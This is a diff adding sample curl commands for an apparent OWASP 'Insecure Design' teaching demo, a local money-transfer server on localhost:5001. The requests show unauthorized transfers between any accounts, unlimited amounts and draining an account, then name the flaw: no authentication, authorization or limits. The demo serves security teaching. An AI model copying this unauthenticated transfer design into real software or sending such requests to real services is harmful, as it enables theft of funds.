@@ -1,0 +1,30 @@
+A04 - Insecure Design - Sample Curl Commands
+============================================
+
+Server: python A04_Example_Insecure_Design.py
+Port: 5001
+
+# Check initial user balances:
+curl http://localhost:5001/user/1
+curl http://localhost:5001/user/2
+curl http://localhost:5001/user/3
+
+# Test money transfer (defaults: from account 1 to account 2):
+curl -X POST http://localhost:5001/transfer -H 'Content-Type: application/json' -d '{"amount":100}'
+
+# Test unauthorized transfer (anyone can transfer from any account):
+curl -X POST http://localhost:5001/transfer -H 'Content-Type: application/json' -d '{"from_account":1,"to_account":3,"amount":500}'
+
+# Test excessive transfer (no limits):
+curl -X POST http://localhost:5001/transfer -H 'Content-Type: application/json' -d '{"from_account":3,"to_account":1,"amount":1000000}'
+
+# Drain an account:
+curl -X POST http://localhost:5001/transfer -H 'Content-Type: application/json' -d '{"from_account":2,"to_account":1,"amount":99999}'
+
+# Check balances after transfers:
+curl http://localhost:5001/user/1
+curl http://localhost:5001/user/2
+curl http://localhost:5001/user/3
+
+# Vulnerability: No authentication, authorization, or business logic controls
+# Impact: Anyone can transfer money from any account without restrictions
